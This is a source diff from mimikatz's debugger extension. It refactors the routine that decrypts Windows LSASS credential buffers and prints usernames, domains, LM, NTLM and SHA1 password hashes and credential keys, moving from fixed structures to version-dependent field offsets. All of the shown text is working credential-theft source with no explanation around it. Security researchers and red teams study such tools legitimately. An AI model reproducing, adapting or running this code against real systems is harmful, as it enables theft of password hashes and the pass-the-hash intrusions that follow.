@@ -223,88 +223,62 @@ DECLARE_API(mimikatz)
 UNICODE_STRING uNull = {12, 14, L"(null)"};
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
 {
-	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
-	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
-	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10;
+	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
 	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
 	PKERB_HASHPASSWORD_6 pHashPassword;
 	UNICODE_STRING buffer;
 	PVOID base;
 	DWORD type, i;
 	BOOL isNull = FALSE;
+	PBYTE msvCredentials;
+	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
 
 	if(mesCreds)
 	{
 		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
 		{
 			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
-			credentials = (PUNICODE_STRING) mesCreds;
-			if(credentials->Buffer)
+			if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)->Buffer)
 			{
 				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
-					kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(((PUNICODE_STRING) mesCreds)->Buffer, ((PUNICODE_STRING) mesCreds)->Length);
+					kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length);
 				
 				switch(type)
 				{
 				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
-					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;
-					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
-					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);
-
-					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
-					if(pPrimaryCreds->isLmOwfPassword)
+					pMSVHelper = kuhl_m_sekurlsa_msv_helper();
+					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain), FALSE);
+					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), FALSE);
+					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
+					if(!pMSVHelper->offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisIso))
 					{
-						dprintf("\n\t * LM       : ");
-						kull_m_string_dprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					}
-					if(pPrimaryCreds->isNtOwfPassword)
-					{
-						dprintf("\n\t * NTLM     : ");
-						kull_m_string_dprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					}
-					if(pPrimaryCreds->isShaOwPassword)
-					{
-						dprintf("\n\t * SHA1     : ");
-						kull_m_string_dprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
-					}
-					break;
-				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10:
-					pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) credentials->Buffer;
-					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->UserName, FALSE);
-					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->LogonDomainName, FALSE);
-
-					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
-					dprintf("\n\t * Flags    : I%02x/N%02x/L%02x/S%02x", pPrimaryCreds10->isIso, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword);
-					if(!pPrimaryCreds10->isIso)
-					{
-						if(pPrimaryCreds10->isLmOwfPassword)
+						if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
 						{
 							dprintf("\n\t * LM       : ");
-							kull_m_string_dprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
 						}
-						if(pPrimaryCreds10->isNtOwfPassword)
+						if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
 						{
 							dprintf("\n\t * NTLM     : ");
-							kull_m_string_dprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
 						}
-						if(pPrimaryCreds10->isShaOwPassword)
+						if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
 						{
 							dprintf("\n\t * SHA1     : ");
-							kull_m_string_dprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
+							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
 						}
 					}
-					else
-						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword) + sizeof(USHORT)));
+					else kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
-					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
+					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) msvCredentials;
 					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
 					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
 						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
 					break;
 				default:
 					dprintf("\n\t * Raw data : ");
-					kull_m_string_dprintf_hex(credentials->Buffer, credentials->Length, 1);
+					kull_m_string_dprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
 				}
 			}
 		}
